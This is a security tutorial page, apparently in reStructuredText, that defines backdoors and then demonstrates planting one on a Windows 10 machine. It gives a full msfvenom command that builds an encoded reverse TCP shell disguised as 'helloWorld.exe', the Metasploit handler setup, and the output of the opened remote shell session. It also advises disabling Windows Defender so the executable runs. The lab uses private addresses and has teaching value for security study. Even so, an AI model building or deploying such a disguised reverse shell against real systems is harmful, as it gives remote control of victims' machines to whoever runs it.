.. _backdoorpage:

Backdoor
========
Backdoor_ refers to any method by which authorized and unauthorized users are able to get around normal security measures and gain high level user access (aka root access) on a computer system, network, or software application.

Not all backdoors are malicious.
Backdoors can also be installed by software or hardware makers as a deliberate means of gaining access to their technology after the fact.
Backdoors of the non-criminal variety are useful for helping customers who are hopelessly locked out of their devices or for troubleshooting and resolving software issues. 

Example
-------
In this demonstration, we will be planting a reverse TCP backdoor inside a Windows 10 machine.

We can use MSFVenom_ - one of :ref:`Metasploit<metasploitpage>`'s tools - to compile our backdoor.

.. code-block:: console

    > sudo msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.233.131 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -f exe > helloWorld.exe

``helloWorld.exe`` will be our reverse TCP backdoor.

After transferring the backdoor into the Windows 10 machine, we can start a reverse TCP listener on :ref:`Metasploit<metasploitpage>`.

.. code-block:: console

    > msfconsole

    msf > use exploit/multi/handler

    msf exploit(multi/handler) > set payload windows/shell/reverse_tcp

    msf exploit(multi/handler) > set LHOST 192.168.233.131
    LHOST => 192.168.233.131

    msf exploit(multi/handler) > show options
    
    Module options (exploit/multi/handler):

    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------


    Payload options (windows/shell/reverse_tcp):

    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
    LHOST     192.168.233.131  yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port


    Exploit target:

    Id  Name
    --  ----
    0   Wildcard Target

Run the reverse TCP listener:

.. code-block:: console

    msf exploit(multi/handler) > run

    [*] Started reverse TCP handler on 192.168.233.131:4444

Now, we can go ahead and execute ``helloWorld.exe`` on the Windows 10 machine.

Notice the reverse TCP listener receives a reverse TCP request, and connects into the backdoor.

.. code-block:: console

    [*] Started reverse TCP handler on 192.168.233.131:4444 
    [*] Encoded stage with x86/shikata_ga_nai
    [*] Sending encoded stage (267 bytes) to 192.168.233.1
    [*] Command shell session 1 opened (192.168.233.131:4444 -> 192.168.233.1:59948 ) at 2022-07-12 03:54:06 -0400


    Shell Banner:
    Microsoft Windows [Version 10.0.19044.1766]
    -----
            

    C:\Users\xxx>dir
    dir
    Volume in drive C has no label.
    Volume Serial Number is D818-8EBC

    Directory of C:\Users\xxx

    12/07/2022  14:51    <DIR>          .
    12/07/2022  14:51    <DIR>          ..
    12/07/2022  09:28        27,886,218 xxx.pdf
    12/07/2022  14:51            73,802 helloWorld.exe
    12/07/2022  09:03    <DIR>          xxx
                2 File(s)     27,960,020 bytes
                3 Dir(s)  285,706,674,176 bytes free

    C:\Users\xxx>exit
    exit

    [*] 192.168.233.1 - Command shell session 1 closed.  Reason: User exit

.. important::

    This experiment relies on the ignorance of Windows Defender.
    If the executable does not work, or Windows does not allow it to run, try to allow the execution through Windows Defender, or disable Windows Defender completely.

.. note::

    There are many ways to create a backdoor.
    The demonstration is just one simple way to do it.

.. _Backdoor: https://www.imperva.com/learn/application-security/backdoor-shell-attack/
.. _MSFvenom: https://www.offensive-security.com/metasploit-unleashed/msfvenom/